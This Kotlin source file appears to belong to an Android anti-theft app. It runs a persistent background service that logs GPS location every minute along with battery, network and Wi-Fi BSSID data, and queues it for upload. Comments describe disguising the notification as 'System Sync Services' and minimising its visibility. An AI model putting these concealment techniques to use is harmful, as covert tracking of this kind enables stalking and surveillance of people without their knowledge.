package com.antitheft.ghostnode.services

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.IBinder
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log

import androidx.core.app.NotificationCompat
import androidx.work.*
import com.antitheft.ghostnode.workers.TelemetryWorker
import com.google.android.gms.location.*

class GhostLocationService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        startForeground(1, createNotification())
    }

    @SuppressLint("MissingPermission")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("GhostNode", "Service Started")
        
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 60000) // 1 minute interval
            .setMinUpdateIntervalMillis(30000)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    Log.d("GhostNode", "Location captured: ${location.latitude}, ${location.longitude}")
                    queueTelemetryPayload(location, "periodic_interval")
                }
            }
        }

        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        )

        return START_STICKY // Restart automatically if killed
    }

    private fun queueTelemetryPayload(location: Location, trigger: String) {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
            applicationContext.registerReceiver(null, ifilter)
        }
        val batteryPct: Int = batteryStatus?.let { intent ->
            val level: Int = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale: Int = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            (level * 100 / scale.toFloat()).toInt()
        } ?: 50

        val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkType = connectivityManager.activeNetwork?.let { network ->
            connectivityManager.getNetworkCapabilities(network)?.let { capabilities ->
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Unknown"
                }
            }
        } ?: "Offline"

        var networkDetails = ""
        try {
            if (networkType == "Wi-Fi") {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                networkDetails = wifiManager.connectionInfo?.bssid ?: ""
            } else if (networkType == "Cellular") {
                val telephonyManager = applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                networkDetails = telephonyManager.networkOperatorName ?: ""
            }
        } catch (e: SecurityException) {
            Log.e("GhostNode", "Permission denied for extra network details")
        }

        val finalNetworkType = if (networkDetails.isNotEmpty()) "$networkType ($networkDetails)" else networkType

        // Schedule reliable delivery using WorkManager
        val data = Data.Builder()
            .putDouble("lat", location.latitude)
            .putDouble("lng", location.longitude)
            .putInt("bat", batteryPct)
            .putString("net", finalNetworkType)
            .putString("trigger", trigger)
            .build()


        val workRequest = OneTimeWorkRequestBuilder<TelemetryWorker>()
            .setInputData(data)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
            
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    override fun onDestroy() {
        super.onDestroy()
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            "GHOST_CHANNEL",
            "System Sync Services", // Innocent looking name
            NotificationManager.IMPORTANCE_MIN // MIN importance to hide icon from status bar ideally
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "GHOST_CHANNEL")
            .setContentTitle("Synching Data")
            .setContentText("Background synchronization active")
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }
}
